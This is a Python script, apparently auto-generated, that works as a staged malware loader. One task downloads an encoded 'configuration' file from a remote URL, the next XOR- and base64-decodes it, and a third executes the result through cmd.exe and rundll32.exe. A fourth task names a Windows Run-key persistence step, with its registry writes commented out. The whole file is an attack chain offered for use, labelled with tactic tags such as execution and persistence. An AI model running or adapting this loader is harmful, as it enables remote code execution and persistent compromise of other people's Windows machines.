#!/usr/bin/env python3
import sys
import json
import time
import requests
import base64
import subprocess
import os
from typing import Dict, Any

# Remove the import of winreg as it is not available on non-Windows systems
# import winreg

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'content': None}
    try:
        url = "http://example.com/config"  # Replace with actual URL
        local_filename = "config_file"
        
        # Download the file
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()
        
        with open(local_filename, 'wb') as f:
            for chunk in response.iter_content(8192):
                f.write(chunk)
        
        # Verify file exists and size > 0
        if os.path.exists(local_filename) and os.path.getsize(local_filename) > 0:
            with open(local_filename, 'rb') as f:
                file_content = f.read()
            result['content'] = file_content.hex()
        else:
            raise Exception("File download failed or file is empty.")
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Decode the input content from hex
        content = bytes.fromhex(input_data.get('content', ''))

        # XOR key for decoding
        xor_key = b'\xAA'  # Example key, replace with actual key if different

        # XOR decryption
        decoded_bytes = bytes(b ^ xor_key[0] for b in content)

        # Base64 decode
        decoded_data = base64.b64decode(decoded_bytes).decode('utf-8')

        result = {
            "decoded_data": decoded_data
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        decoded_data = input_data.get('decoded_data', '')

        # Execute the decoded content using cmd.exe
        cmd_process = subprocess.run(
            ['cmd.exe', '/c', decoded_data],
            capture_output=True,
            text=True,
            timeout=30
        )

        if cmd_process.returncode != 0:
            # Log the error and continue
            print(f"cmd.exe execution failed: {cmd_process.stderr}")

        # Assuming decoded_data contains DLL path and entrypoint for rundll32 execution
        # Example: "C:\\path\\to\\dll.dll,EntryPoint"
        if ',' in decoded_data:
            dll_path, entrypoint = decoded_data.split(',', 1)
            rundll32_process = subprocess.run(
                ['rundll32.exe', dll_path.strip(), entrypoint.strip()],
                capture_output=True,
                timeout=30
            )

            if rundll32_process.returncode != 0:
                # Log the error and return success=False
                print(f"rundll32.exe execution failed: {rundll32_process.stderr}")
                return {'success': False, 'data': {},
                        'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

        return {'success': True, 'data': {},
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'registered': False}
    
    try:
        # Define the registry path and the executable path
        registry_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        program_name = 'MyProgram'
        exe_path = r'C:\Path\To\MyProgram.exe'  # This should be the path to the executable

        # Open the registry key
        # with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
        #     # Set the value to register the program
        #     winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, exe_path)
        
        # Verify the registration
        # with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_READ) as key:
        #     registered_exe_path, _ = winreg.QueryValueEx(key, program_name)
        #     if registered_exe_path == exe_path:
        #         result['registered'] = True

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Retrieve Configuration File [exfiltration] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Retrieve Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Retrieve Configuration File): FAILED — {err}')
            failed.append('T1')
            r2 = task_T1(None)
            if r2.get('success'):
                outputs['T1'] = r2.get('data', {})
                failed.remove('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T4: Establish Persistence [persistence] ──
    try:
        r = task_T4(None)
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Establish Persistence): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Establish Persistence): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T2: Decode Configuration File [data-processing] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Decode Configuration File): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Decode Configuration File): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Execute Decoded Content [execution] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Execute Decoded Content): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Execute Decoded Content): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))